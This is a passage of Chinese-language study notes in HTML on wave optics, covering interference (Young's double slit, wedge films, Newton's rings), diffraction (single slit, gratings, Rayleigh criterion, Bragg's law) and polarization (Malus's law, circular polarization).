<p>其中，<span class="arithmatex">\(I_1\)</span> 和 <span class="arithmatex">\(I_2\)</span> 是两列光波的强度，<span class="arithmatex">\(\Delta \varphi\)</span> 是相位差。</p>
<p>当 <span class="arithmatex">\(I_1 = I_2\)</span> 时，光强分布为：</p>
<div class="arithmatex">\[
I = 4I_1 \cos^2 \frac{\Delta \varphi}{2}
\]</div>
<p>这表明光强的最大值为 <span class="arithmatex">\(I_{\text{max}} = 4I_1\)</span>，最小值为 <span class="arithmatex">\(I_{\text{min}} = 0\)</span>。</p>
<p><div align=center>
<img src="../NOTE/Physics/img/light/light17.png" width="60%"/>
    </div></p>
</div>
<h4 id="note-physics-light-_19">媒质中的光程<a class="headerlink" href="#note-physics-light-_19" title="Permanent link">&para;</a></h4>
<p>相位差在分析光的干涉时十分重要，为便于计算光通过不同媒质时的相位差，引入“光程差”的概念。(光程是 <span class="arithmatex">\(\int n ds\)</span>)</p>
<div class="arithmatex">\[
    \Delta \varphi = \dfrac{2\pi}{\lambda} \Delta L
\]</div>
<p>如果在介质中</p>
<div class="arithmatex">\[
\lambda_n = \dfrac{v}{f} = \dfrac{c/n}{f} = \dfrac{c/f}{n} = \dfrac{\lambda_0}{n}
\]</div>
<p>此时</p>
<div class="arithmatex">\[
     \Delta \varphi = \dfrac{2\pi}{\lambda} n \Delta  L
\]</div>
<div class="admonition summary">
<p class="admonition-title">结论</p>
<ul>
<li>相干条件：振动方向相同，相位差恒定,频率相同</li>
</ul>
<p>干涉判断：</p>
<div class="arithmatex">\[
\Delta \varphi = 
\begin{cases} 
\pm 2k\pi, &amp; k = 0,1,2,\ldots \quad (\text{干涉加强}) \\
\pm (2k + 1)\pi, &amp; k = 0,1,2,\ldots \quad (\text{干涉减弱})
\end{cases}
\]</div>
<div class="arithmatex">\[
\delta = 
\begin{cases} 
\pm k\lambda_0, &amp; k = 0,1,2,\ldots \quad (\text{干涉加强}) \\
\pm \left(2k + 1\right)\dfrac{\lambda_0}{2}, &amp; k = 0,1,2,\ldots \quad (\text{干涉减弱})
\end{cases}
\]</div>
</div>
<h4 id="note-physics-light-_20">杨氏双缝干涉实验<a class="headerlink" href="#note-physics-light-_20" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/light/light18.png" width="60%"/>
</div>

<div align=center>
    <img src="../NOTE/Physics/img/light/light19.png" width="60%"/>
</div>

<ul>
<li>干涉相长，明纹：<span class="arithmatex">\(\delta = d \cdot \frac{x}{D} = \pm k\lambda\)</span></li>
<li>干涉相消，暗纹：<span class="arithmatex">\(\delta = d \cdot \frac{x}{D} = \pm (2k - 1)\frac{\lambda}{2}\)</span></li>
<li>暗纹中心：<span class="arithmatex">\(x_{\pm(2k+1)} = \pm (2k - 1)\frac{D}{2d}\lambda, \, k = 1,2,3\ldots\)</span></li>
<li>明纹中心：<span class="arithmatex">\(x_{\pm k} = \pm k\frac{D}{d}\lambda, \, k = 0,1,2,3\ldots\)</span></li>
<li>两相邻明纹（或暗纹）间距：<span class="arithmatex">\(\Delta x = \frac{D}{d}\lambda\)</span></li>
</ul>
<details class="question">
<summary>Question</summary>
<ul>
<li>
<p>若S1、S2两条缝的宽度不等，条纹有何变化？ 
两条缝的宽度不等，使两光束的强度不等；虽然干涉条纹中心距不变，但原极小处的强度不再为零，条纹的可见度变差。</p>
</li>
<li>
<p>若使用白光进行干涉实验，条纹有何变化？
若使用白光光源，则在中央零级出现白色亮纹，两侧对称排列若干彩色条纹。</p>
</li>
<li>
<p>用白光 作双缝干涉实验时，能观察 到几级清晰可辨的彩色光谱？
在中央白色明纹两侧， 只有第一级彩色光谱是清晰可辨的。</p>
</li>
</ul>
</details>
<h4 id="note-physics-light-_21">洛埃德镜实验<a class="headerlink" href="#note-physics-light-_21" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/light/light20.png" width="60%"/>
</div>

<p>当屏移到A'B'位置时，在屏上的P点出现暗条纹。这一结论证实，光在镜子表面反射时有相位<span class="arithmatex">\(\pi\)</span>突变。</p>
<p><mark class="critic">Reflection Phase Shifts</mark>半波损失</p>
<p>如果光是从光 疏媒质传向光密媒质，在其分界面上反射时将发生半波损失，折射波无半波损失。在上述实验中，光从空气传向玻璃，因此在反射时发生半波损失。产生<span class="arithmatex">\(\pi\)</span>的相位差，因此为暗纹。</p>
<h4 id="note-physics-light-_22">等厚干涉<a class="headerlink" href="#note-physics-light-_22" title="Permanent link">&para;</a></h4>
<p>当一束平行光入射到厚度不均匀的透明介质薄膜上，如图所示，两光线 <span class="arithmatex">\(a\)</span> 和 <span class="arithmatex">\(b\)</span> 的光程差：</p>
<div class="arithmatex">\[
\delta = 2n_2e + \delta'
\]</div>
<p>其中，<span class="arithmatex">\(\delta'\)</span> 为因为半波损失而产生的附加光程差。</p>
<ul>
<li>当 <span class="arithmatex">\(e\)</span> 保持不变时，光程差仅与膜的厚度有关，凡厚度相同的地方光程差相同，从而对应同一条干涉条纹 —— 等厚干涉条纹。</li>
</ul>
<div align=center>
    <img src="../NOTE/Physics/img/light/light21.png" width="60%"/>
</div>

<p><strong>劈尖膜</strong></p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light22.png" width="60%"/>
</div>

<p>从空气到玻璃存在半波损失</p>
<div class="arithmatex">\[
    \delta = 2ne + \frac{\lambda}{2}
\]</div>
<p>发生干涉时</p>
<div class="arithmatex">\[
    \delta = \begin{cases}
    2ne + \frac{\lambda}{2} = k\lambda, &amp; \text{明纹} \\
    2ne + \frac{\lambda}{2} = (2k - 1)\frac{\lambda}{2}, &amp; \text{暗纹}
    \end{cases}
\]</div>
<p>相邻明纹（或暗纹）</p>
<div class="arithmatex">\[
    \Delta e = \frac{\lambda}{2n}
\]</div>
<details class="example">
<summary>利用劈尖测量工件凹凸</summary>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light23.png" width="60%"/>
</div>
如果工件表面是精确的平面,等厚干涉条纹应该是等距离的平行直条纹，现在观察到的干涉条纹弯向空气膜的左端。因此，可判断工件表面是下凹的</p>
<p>利用相似三角形关系，我们可以得到：</p>
<div class="arithmatex">\[
\frac{a}{b} = \frac{\Delta h}{(e_k - e_{k-1})} = \frac{\Delta h}{\frac{\lambda}{2}}
\]</div>
<p>所以：</p>
<div class="arithmatex">\[
\Delta h = \frac{a \lambda}{b \cdot 2}
\]</div>
</details>
<p><strong>牛顿环实验</strong></p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light29.png" width="60%"/>
</div>

<p>光程差为</p>
<div class="arithmatex">\[
    \delta = 2e + \frac{\lambda}{2}
\]</div>
<div class="arithmatex">\[
\delta = 2e + \frac{\lambda}{2} = 
\begin{cases} 
k\lambda, &amp; (k = 1, 2, 3, \ldots) \quad \text{明纹} \\ 
(2k + 1)\frac{\lambda}{2}, &amp; (k = 0, 1, 2, \ldots) \quad \text{暗纹} 
\end{cases}
\]</div>
<p>由几何关系可知</p>
<div class="arithmatex">\[
(R - e)^2 + r^2 = R^2
\]</div>
<p>展开并简化得到：</p>
<div class="arithmatex">\[
R^2 - 2Re + e^2 + r^2 = R^2
\]</div>
<p>忽略 <span class="arithmatex">\(e^2\)</span> 项，得到：</p>
<div class="arithmatex">\[
e = \frac{r^2}{2R}
\]</div>
<div class="arithmatex">\[
r = 
\begin{cases} 
\sqrt{(k - \frac{1}{2})R\lambda}, &amp; k = 1, 2, 3, \ldots \quad \text{明环} \\ 
\sqrt{kR\lambda}, &amp; k = 0, 1, 2, \ldots \quad \text{暗环} 
\end{cases}
\]</div>
<p>对于 <span class="arithmatex">\(k = 0\)</span>，<span class="arithmatex">\(r = 0\)</span>，中心是暗斑。</p>
<p>对于 <span class="arithmatex">\(k = 1\)</span>，</p>
<div class="arithmatex">\[
r = 
\begin{cases} 
\sqrt{\frac{1}{2}R\lambda}, &amp; k = 1, 2, 3, \ldots \quad \text{明环} \\ 
\sqrt{R\lambda}, &amp; k = 0, 1, 2, \ldots \quad \text{暗环} 
\end{cases}
\]</div>
<div class="arithmatex">\[
\Delta r = r_{k+1} - r_k = \frac{\sqrt{R\lambda}}{\sqrt{k} + \sqrt{k+1}}
\]</div>
<p>牛顿环是等厚干涉，其干涉条纹是内疏外密的同心圆环。</p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light30.png" width="60%"/>
</div>

<h3 id="note-physics-light-diffraction">光的衍射(Diffraction)<a class="headerlink" href="#note-physics-light-diffraction" title="Permanent link">&para;</a></h3>
<p>光在传播过程中遇到障碍物时，会绕过障碍物继续传播，这种现象称为光的衍射。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>菲涅尔衍射:菲涅耳衍射是指当光源和观察屏，或两者之一离障碍物（衍射屏）的距离为<mark class="critic">有限远</mark>时，所发生的衍射现象</li>
<li>夫琅禾费衍射:当光源和观察屏两者均离障碍物（衍射屏）的距离为<mark class="critic">无限远</mark>时，所发生的衍射现象</li>
</ul>
</div>
<div class="admonition info">
<p class="admonition-title">惠更斯-菲涅尔原理</p>
<ul>
<li>惠更斯原理：波面上的每一点都可以看作是新的次波源，这些次波源发出的球面次波(wavelets)的包络面就是新的波c面。</li>
<li>惠更斯-菲涅尔原理：次波源发出的球面次波在空间某点的相干叠加，决定了该点波的强度。</li>
</ul>
<div class="arithmatex">\[
dE = CK(\theta) \frac{dS}{r} \cos\left(\omega t - \frac{2\pi r}{\lambda}\right)
\]</div>
<ul>
<li><span class="arithmatex">\(K(\theta)\)</span> 为倾斜因子，当 <span class="arithmatex">\(\theta = 0\)</span> 时，<span class="arithmatex">\(K(\theta) = 1\)</span>( 沿原波传播方向的子波振幅最大)，<span class="arithmatex">\(\theta\)</span> 越大，<span class="arithmatex">\(K(\theta)\)</span> 越小, 当 <span class="arithmatex">\(\theta = \frac{\pi}{2}\)</span> 时，<span class="arithmatex">\(K(\theta) = 0\)</span>。大于 <span class="arithmatex">\(\frac{\pi}{2}\)</span> 时，<span class="arithmatex">\(K(\theta)\)</span> 为0，子波不能向后传播。</li>
</ul>
</div>
<div class="admonition key-point">
<p class="admonition-title">惠更斯-菲涅尔原理的数学表示</p>
<div class="arithmatex">\[
E(P) = \int_S \frac{CK(\theta)}{r} \cos\left(\omega t - \frac{2\pi r}{\lambda}\right) dS
\]</div>
<p>在夫琅禾费衍射中，由于距离是无限远，所以 <span class="arithmatex">\(r\)</span> 和 <span class="arithmatex">\(\theta\)</span> 都是常数，可以写成：</p>
<div class="arithmatex">\[ 
E(P) \propto \int_S  \cos\left(\omega t - \frac{2\pi r}{\lambda}\right)  dS 
\]</div>
</div>
<h4 id="note-physics-light-_23">单缝夫琅禾费衍射<a class="headerlink" href="#note-physics-light-_23" title="Permanent link">&para;</a></h4>
<p>光路图如下：</p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light31.png" width="60%"/>
</div>

<ul>
<li>光程差：<span class="arithmatex">\(\delta = a \sin \theta\)</span>，这是因为费马原理等光程</li>
</ul>
<div align=center>
    <img src="../NOTE/Physics/img/light/light32.png" width="60%"/>
</div>

<p>当 <span class="arithmatex">\(\theta = 0\)</span> 时，<span class="arithmatex">\(a \sin \theta = 0\)</span>，此时为中央明纹</p>
<h4 id="note-physics-light-_24">菲涅尔半波带法<a class="headerlink" href="#note-physics-light-_24" title="Permanent link">&para;</a></h4>
<p>在波阵面上截取一个条状带，使它上下两边缘发的光在屏上处的光程差为 <span class="arithmatex">\(\lambda/2\)</span>，此带称为半波带。</p>
<ul>
<li>当 <span class="arithmatex">\(a \sin \theta = \lambda\)</span> 时，可将缝分为两个“半波带”。</li>
</ul>
<div align=center>
    <img src="../NOTE/Physics/img/light/light33.png" width="60%"/>
</div>

<ul>
<li>相邻半波带上对应点发的光在 <span class="arithmatex">\(P\)</span> 处干涉相消形成暗纹。</li>
</ul>
<p>由半波带法可得明暗纹条件：</p>
<ul>
<li>暗纹：<span class="arithmatex">\(a \sin \theta = \pm k\lambda\)</span>, <span class="arithmatex">\(k = 1,2,3,\ldots\)</span></li>
<li>明纹：<span class="arithmatex">\(a \sin \theta = \pm (2k + 1)\frac{\lambda}{2}\)</span>, <span class="arithmatex">\(k = 1,2,\ldots\)</span></li>
<li>中央明纹：<span class="arithmatex">\(a \sin \theta = 0\)</span></li>
</ul>
<p>对于其它角度，使用振幅矢量叠加法；</p>
<div class="arithmatex">\[
A_\theta = A_1 + A_1 e^{i\Delta\varphi} + A_1 e^{i2\Delta\varphi} + \ldots + A_1 e^{i(N-1)\Delta\varphi}
\]</div>
<p>通过公式推导，我们可以得到：</p>
<div class="arithmatex">\[
A_\theta = A_1 \frac{e^{iN\Delta\varphi} - 1}{e^{i\Delta\varphi} - 1} = A_1 \frac{e^{iN\Delta\varphi/2} \left(e^{iN\Delta\varphi/2} - e^{-iN\Delta\varphi/2}\right)}{e^{i\Delta\varphi/2} \left(e^{i\Delta\varphi/2} - e^{-i\Delta\varphi/2}\right)}
\]</div>
<p>这可以进一步简化为：</p>
<div class="arithmatex">\[
A_\theta = A_1 \frac{\sin(N\Delta\varphi/2)}{\sin(\Delta\varphi/2)}
\]</div>
<p>振幅的绝对值为：</p>
<div class="arithmatex">\[
|A_\theta| = A_1 \frac{\sin(N\Delta\varphi/2)}{\sin(\Delta\varphi/2)}
\]</div>
<p>当 <span class="arithmatex">\(N\Delta\varphi = \frac{2\pi}{\lambda} a \sin \theta\)</span> 时，我们可以定义：</p>
<mark class="critic block">
<div class="arithmatex">\[
u = \frac{\pi}{\lambda} a \sin \theta
\]</div>
</mark>
<p>因此，振幅可以近似为：</p>
<div class="arithmatex">\[
|A_\theta| \approx A_1 N \frac{\sin u}{u}
\]</div>
<p>这表明光的强度分布与 <span class="arithmatex">\(\sin u / u\)</span> 的形式有关，称为“sinc”函数。</p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light34.png" width="60%"/>
</div>

<p>暗纹当 sinc 函数为 0, <span class="arithmatex">\( u = \pi \)</span>, <span class="arithmatex">\( a \sin \theta = k \lambda \)</span>, 即 <span class="arithmatex">\( \sin \theta = \frac{k \lambda}{a} \)</span></p>
<p>次级大宽度为两个相邻暗纹之间的距离，即：</p>
<div class="arithmatex">\[
\Delta \sin \theta = \frac{\lambda}{a}
\]</div>
<p>如果问实际距离，则需要乘以 <span class="arithmatex">\(D\)</span>(前提是角度很小)</p>
<div class="admonition note">
<p class="admonition-title">波长变化对于衍射条纹的影响</p>
<p>假设固定<span class="arithmatex">\(\lambda\)</span>，变化<span class="arithmatex">\(a\)</span>，则条纹间距会变化。</p>
<ul>
<li>
<p>当 <span class="arithmatex">\(\frac{\lambda}{a} \to 1\)</span> 时，<span class="arithmatex">\(\sin \theta_0 \to 1\)</span>，此时屏幕已无暗纹；</p>
</li>
<li>
<p>当 <span class="arithmatex">\(\frac{\lambda}{a} \to \infty\)</span> 时，<span class="arithmatex">\(\Delta x_0 = \infty\)</span>，此时屏幕亮度均匀；</p>
</li>
<li>
<p>当 <span class="arithmatex">\(\frac{\lambda}{a} \to 0\)</span> 时，<span class="arithmatex">\(\Delta x_0 \to 0\)</span> 此时衍射图样聚集在一起，屏幕上只显出单一的亮线——单缝的几何光学像。(a很大，相当于没有阻挡，正常的几何光学成像)</p>
</li>
</ul>
</div>
<div class="admonition info">
<p class="admonition-title">圆孔的夫琅禾费衍射</p>
<p>实验装置如下：</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light35.png" width="60%"/>
</div></p>
<p>其会形成一系列的同心圆环，称为“爱里斑”。</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light36.png" width="60%"/>
</div></p>
</div>
<h4 id="note-physics-light-_25">衍射受限与瑞利判据<a class="headerlink" href="#note-physics-light-_25" title="Permanent link">&para;</a></h4>
<p>理想点光源的像是一个点，但实际上由于衍射，像是一个爱里斑。(可以近似为一个宽度为透镜高度，后面是无限大透镜的衍射)</p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light37.png" width="60%"/>
</div>

<p>很近的两个物点象斑有可能重叠，从而分辨不清。</p>
<div class="admonition tip">
<p class="admonition-title">瑞利判据</p>
<p>对于两个等光强的非相干物点,若其中一点的象斑中心恰好落在另一点的象斑的边缘(第一暗纹处),则此两物点被认为是刚刚可以分辨。此时两个爱里斑重叠部分的光强为爱里斑中心光强的80%。</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light38.png" width="60%"/>
</div></p>
</div>
<h4 id="note-physics-light-_26">光栅衍射<a class="headerlink" href="#note-physics-light-_26" title="Permanent link">&para;</a></h4>
<div class="admonition definition">
<p class="admonition-title">光栅</p>
<p>光栅—大量等宽等间距的平行狭缝(或反射面) 构成的光学元件。</p>
<p>光栅常数：周期长度 <span class="arithmatex">\(d = a + b\)</span></p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/grating.png" width="60%"/>
</div></p>
</div>
<p>光栅的衍射图样为在原单缝的中央明纹中，出现暗纹，随着 <span class="arithmatex">\(N\)</span> 的增加，衍射条纹的亮度会逐渐增加，但是也逐渐变细。</p>
<p>是多个单缝衍射的干涉结果。</p>
<div align=center>
    <img src="../NOTE/Physics/img/light/light39.png" width="60%"/>
</div>

<p>相邻两光的相位差为</p>
<div class="arithmatex">\[
\Delta \varphi = \frac{2\pi d \sin \theta}{\lambda}
\]</div>
<p>相邻振动的振幅 <span class="arithmatex">\(A_1, A_2, \ldots, A_N\)</span></p>
<div class="arithmatex">\[
A_2 = A_1 e^{i \Delta \varphi}
\]</div>
<div class="arithmatex">\[
A_3 = A_1 e^{i 2 \Delta \varphi}
\]</div>
<div class="arithmatex">\[
\vdots
\]</div>
<div class="arithmatex">\[
A_N = A_1 e^{i (N-1) \Delta \varphi}
\]</div>
<div class="arithmatex">\[
A_p = A_1 + A_2 + \ldots + A_N
\]</div>
<div class="arithmatex">\[
= A_1 + A_1 e^{i \Delta \varphi} + \ldots + A_1 e^{i (N-1) \Delta \varphi}
\]</div>
<div class="arithmatex">\[
= A_1 \frac{e^{iN\Delta \varphi/2}}{e^{i\Delta \varphi/2}} \frac{\sin(N\Delta \varphi/2)}{\sin(\Delta \varphi/2)}
\]</div>
<div class="arithmatex">\[
|A_p| = A_1 \frac{\sin(N\Delta \varphi/2)}{\sin(\Delta \varphi/2)}
\]</div>
<p>这里类似于单缝衍射的振幅矢量叠加法，但是也有所不同。</p>
<ul>
<li>当 <span class="arithmatex">\(\Delta \varphi = 2k\pi\)</span> 时，每一个振幅矢量方向相同，所以 <span class="arithmatex">\(A_p = NA_1\)</span>，此时为最大值。</li>
</ul>
<p>即</p>
<div class="arithmatex">\[
d \sin \theta = \pm k \lambda \quad k = 0, 1, 2, \ldots \quad k &lt; \frac{d}{\lambda} \quad 
\]</div>
<p>这里的<span class="arithmatex">\(k\)</span>有范围，因为<span class="arithmatex">\(d \sin \theta\)</span> 最大为 <span class="arithmatex">\(d\)</span>，所以 <span class="arithmatex">\(k\)</span> 最大为 <span class="arithmatex">\(\frac{d}{\lambda}\)</span>。</p>
<p><strong>k为主极大级数，k=0称中央明纹。光栅极大的位置由相邻狭缝间的干涉极大决定</strong></p>
<ul>
<li>当<span class="arithmatex">\(N\Delta \varphi = 2k\pi\)</span>时，此时矢量叠加闭合，<span class="arithmatex">\(A_p = 0\)</span>，此时为暗纹。</li>
</ul>
<div class="arithmatex">\[
N d \sin \theta = \pm k' \lambda \quad k' = 1, 2, 3, \ldots, N - 1 \quad (k' \neq kN)
\]</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>k'不能取N的整数倍，因为这时是主极大的位置。</p>
</div>
<div class="admonition summary">
<p class="admonition-title">光栅衍射的谱线特点</p>
<p><img alt="alt text" src="../NOTE/Physics/image-10.png" /></p>
<p>1）主级大明纹的位置与缝数N无关，它们对称地分布在中央明纹的两侧，中央明纹光强最大；</p>
<p>2）在相邻的两个主级大之间，有N−1个极小（暗纹）和N−2个光强很小的次极大，当N很大时，实际上在相邻的主极大之间形成一片暗区，即能获得又细又亮暗区很宽的光栅衍射条纹。</p>
</div>
<div class="admonition info">
<p class="admonition-title">定量分析光栅衍射的光强</p>
<div class="arithmatex">\[
I = I_0 \left( \frac{\sin u}{u} \right)^2 \left( \frac{\sin N \beta}{\sin \beta} \right)^2
\]</div>
<p>其中</p>
<div class="arithmatex">\[
u = \frac{\pi a \sin \theta}{\lambda}
\]</div>
<div class="arithmatex">\[
\beta = \frac{\pi d \sin \theta}{\lambda}
\]</div>
<p>当 <span class="arithmatex">\(\theta \to 0\)</span> 时，<span class="arithmatex">\(I_m \to N^2 I_0\)</span>，所以缝数越多，光强越大。</p>
<p><mark class="critic">半角宽度</mark></p>
<p><img alt="alt text" src="../NOTE/Physics/image-13.png" /></p>
<p>如果 <span class="arithmatex">\(\theta\)</span> 不小，<span class="arithmatex">\(\sin \theta \neq \theta\)</span></p>
<div class="arithmatex">\[
d \sin \theta = m \lambda
\]</div>
<p>与它最近的0点为(<span class="arithmatex">\(Nd\sin \theta' = (mN + 1) \lambda\)</span>)</p>
<div class="arithmatex">\[
d \sin (\theta + \Delta \theta) = (m + \frac{1}{N}) \lambda
\]</div>
<p>所以使用拉格朗日中值定理，有</p>
<div class="arithmatex">\[
d \cos \theta \cdot \Delta \theta = \frac{1}{N} \lambda
\]</div>
<div class="arithmatex">\[
\Delta \theta = \frac{\lambda}{N d \cos \theta}
\]</div>
<p><span class="arithmatex">\(\theta\)</span> 很小时，<span class="arithmatex">\(\cos \theta \to 1\)</span>，所以</p>
<div class="arithmatex">\[
\Delta \theta = \frac{\lambda}{N d}
\]</div>
<p>所以缝越多，半角宽度越小，条纹越细。</p>
</div>
<h4 id="note-physics-light-_27">光栅衍射的缺极<a class="headerlink" href="#note-physics-light-_27" title="Permanent link">&para;</a></h4>
<p>缺级：缺级是指光栅中不同单缝衍射互相干涉的主极大位置于单缝衍射的暗纹位置重合，导致光栅衍射的明纹消失。</p>
<p>即</p>
<div class="arithmatex">\[
    d \sin \theta = \pm k \lambda 
\]</div>
<div class="arithmatex">\[
    a \sin \theta = \pm k' \lambda
\]</div>
<p>当 <span class="arithmatex">\(\dfrac{a}{d} = \dfrac{k'}{k}\)</span> 时，光栅衍射的明纹消失。</p>
<p>如果说第一个缺级出现在<span class="arithmatex">\(k=2\)</span>(<span class="arithmatex">\(k'=1\)</span>),这说明<span class="arithmatex">\(d=2a=a+b\)</span>，即<span class="arithmatex">\(b=a\)</span>。</p>
<p><img alt="{alt text}" src="../NOTE/Physics/image-11.png" /></p>
<p>图例给出的是<span class="arithmatex">\(d=4a\)</span>的情况；</p>
<p><br></p>
<div class="admonition info">
<p class="admonition-title">光栅光谱</p>
<p>光栅光谱是指复色光照射光栅时，谱线按波长向外侧依次分开排列，形成的光谱；</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light40.png" width="60%"/>
</div></p>
<p>只有第一级，第二级开始有重叠。</p>
</div>
<div class="admonition info">
<p class="admonition-title">光栅光谱的分辨本领</p>
<p>光栅的分辨本领是指把波长靠得很近的两条谱线分辨的清楚的本领。</p>
<p>与瑞利判据类似，当两条谱线刚好能分辨时，一个在极大，一个在极小。</p>
<p><img align="right" alt="{alt text}" src="../NOTE/Physics/image-12.png" /></p>
<p>波长为 <span class="arithmatex">\(\lambda + \Delta \lambda\)</span> 的第 <span class="arithmatex">\(k\)</span> 级主极大的角位置为：</p>
<div class="arithmatex">\[
(a + b) \sin \theta = k (\lambda + \Delta \lambda)
\]</div>
<p>波长为 <span class="arithmatex">\(\lambda\)</span> 的第 <span class="arithmatex">\(kN+1\)</span> 级极小的角位置为：</p>
<div class="arithmatex">\[
N (a + b) \sin \theta = (kN + 1) \lambda
\]</div>
<p>因此，分辨本领 <span class="arithmatex">\(R\)</span> 为：</p>
<div class="arithmatex">\[
R = \dfrac{\lambda}{\Delta \lambda} = kN
\]</div>
<p>即要分辨清楚第<span class="arithmatex">\(k\)</span>级谱线，需要<span class="arithmatex">\(N\)</span>条缝。这里的<span class="arithmatex">\(\lambda\)</span>是平均波长，<span class="arithmatex">\(\Delta \lambda\)</span>是波长偏移。</p>
</div>
<div class="admonition answer">
<p class="admonition-title">色散本领与分辨本领</p>
<p>首先，对于<span class="arithmatex">\(m\)</span>级的主极大，有</p>
<div class="arithmatex">\[
d \sin \theta = m \lambda
\]</div>
<p>所以两边同时取微分，有</p>
<div class="arithmatex">\[
d \cos \theta \cdot \Delta \theta = m \cdot \Delta \lambda
\]</div>
<p>所以可以定义色散本领</p>
<div class="arithmatex">\[
D = \frac{\Delta \theta}{\Delta \lambda} = \frac{m}{d \cos \theta}
\]</div>
<p>使用瑞利判据，当其可以分辨时，两者角度相差为半角宽度，即</p>
<div class="arithmatex">\[
\Delta \theta = \frac{\lambda}{N d \cos \theta} 
\]</div>
<p>所以此时可以分辨的极限波长差为</p>
<div class="arithmatex">\[
\Delta \lambda =  \dfrac{\Delta \theta}{D} = \frac{\lambda}{N d \cos \theta} \cdot \frac{d \cos \theta}{m} = \frac{\lambda}{N m}
\]</div>
<p>所以分辨本领定义为</p>
<div class="arithmatex">\[
R = \frac{\lambda}{\Delta \lambda} = Nm
\]</div>
</div>
<h4 id="note-physics-light-bragg">Bragg 公式<a class="headerlink" href="#note-physics-light-bragg" title="Permanent link">&para;</a></h4>
<div align=center>
    <img src="../NOTE/Physics/img/light/light41.png" width="60%"/>
</div>

<p>布拉格公式：</p>
<div class="arithmatex">\[
2d \sin \theta = n \lambda
\]</div>
<p>其中<span class="arithmatex">\(d\)</span>是晶格常数，<span class="arithmatex">\(\theta\)</span>是入射角，<span class="arithmatex">\(n\)</span>是整数，<span class="arithmatex">\(\lambda\)</span>是波长。</p>
<p>解释了不同晶面间反射的干涉增强条件.</p>
<h3 id="note-physics-light-polarization">光的偏振(Polarization)<a class="headerlink" href="#note-physics-light-polarization" title="Permanent link">&para;</a></h3>
<p>在自然光中，光波的电矢量在任意时刻和任意位置的方向都是随机的，这种光称为非偏振光。而在某些情况下，光波的电矢量在某一方向上的振动，而在另一方向上的振动为零，这种光称为偏振光。</p>
<h4 id="note-physics-light-_28">线偏振光<a class="headerlink" href="#note-physics-light-_28" title="Permanent link">&para;</a></h4>
<p>自然光通过偏振片之后，只有在某一方向上的电矢量振动，这种光称为线偏振光。
只有与偏振片的缝方向<mark class="critic">垂直</mark>的电矢量才能通过;其它的电矢量会被吸收。</p>
<p>在自然光中，任意两个垂直分量的振幅是相等的，即可以把自然光分解为任意两个垂直方向的线偏振光的叠加，那么经过偏振片后，只有与偏振片允许(TA)的分量通过，其它分量被吸收。假设自然光的电矢量为<span class="arithmatex">\(E_0\)</span>,则经过偏振片后的电矢量为<span class="arithmatex">\(\dfrac{E_0}{\sqrt{2}}\)</span>。光强为<span class="arithmatex">\(I_0\)</span>，则经过偏振片后的光强为<span class="arithmatex">\(\dfrac{I_0}{2}\)</span>。(<span class="arithmatex">\(I_0 \propto E_0^2\)</span>)</p>
<div class="admonition info">
<p class="admonition-title">马隆定律</p>
<p>线偏振光通过与振动方向成<span class="arithmatex">\(\theta\)</span>角的偏振片后，光强为<span class="arithmatex">\(I = I_0 \cos^2 \theta\)</span>。</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light42.png" width="60%"/> <br />
</div></p>
<p>所以在上图中<span class="arithmatex">\(I_2=I_1 \cos^2 \theta\)</span></p>
</div>
<div class="admonition key-point">
<p class="admonition-title">利用马隆定律推导自然光通过偏振片后的光强</p>
<p>我们知道自然光通过任意方向偏振片光强都变为原来的一半；我们可以使用马隆定律来推导这一结论。</p>
<p>首先，对于自然光，可以将其看作无数个方向上的振动，它与偏振片的夹角为<span class="arithmatex">\(\alpha\)</span>,<span class="arithmatex">\(\alpha\)</span>满足<span class="arithmatex">\(0\)</span>到<span class="arithmatex">\(2\pi\)</span>的均匀分布。</p>
<p>概率密度为<span class="arithmatex">\(p=\dfrac{1}{2\pi}\)</span>，所以通过偏振片后的光强为
对应的光强为<span class="arithmatex">\(I = I_0 \cos^2 \alpha\)</span>，所以平均光强为</p>
<div class="arithmatex">\[
\overline{I} = \int_0^{2\pi} \dfrac{1}{2\pi} I_0 \cos^2 \alpha d\alpha = \dfrac{1}{2} I_0
\]</div>
</div>
<div class="admonition eg">
<p class="admonition-title">例子</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/light/light43.png" width="60%"/>
</div></p>
<p>一束沿<span class="arithmatex">\(x\)</span>方向的线偏振光,经过两个偏振片，第一个偏振片(TA方向)与<span class="arithmatex">\(x\)</span>轴成<span class="arithmatex">\(\theta\)</span>角，第二个偏振片与<span class="arithmatex">\(y\)</span>轴平行,求<span class="arithmatex">\(\theta\)</span>为多少时，第二个偏振片的透射光强最大。</p>
<div class="arithmatex">\[
    I_2 = I_1 \cos^2 \theta \cos^2(90^\circ - \theta) = I_1 \cos^2 \theta \sin^2 \theta
\]</div>
<p>基本不等式可知，当<span class="arithmatex">\(\theta = 45^\circ\)</span>时，透射光强最大。</p>
</div>
<h4 id="note-physics-light-_29">常见偏振态<a class="headerlink" href="#note-physics-light-_29" title="Permanent link">&para;</a></h4>
<p><strong>线偏振光</strong>
对于两束等强正交线偏振光，如果其相位差为<span class="arithmatex">\(k \pi\)</span>，则同时变大，同时变小，合成的为线偏振光。</p>
<p><strong>圆偏振光</strong></p>
<figure>
  <img alt="alt text" src="../NOTE/Physics/image-15.png" />
<br />
<figcaption>RCP</figcaption>
</figure>
<figure>
  <img alt="alt text" src="../NOTE/Physics/image-16.png" />
<br />
<figcaption>LCP</figcaption>
</figure>
<p>如果两束等强正交线偏振光的相位差为<span class="arithmatex">\(\dfrac{\pi}{2}+k \pi\)</span>，则其中一束光最大时，另一束光最小，周期性振动，合成的为圆偏振光。</p>
<p>由先到达最大的向后到达最大的旋转.</p>
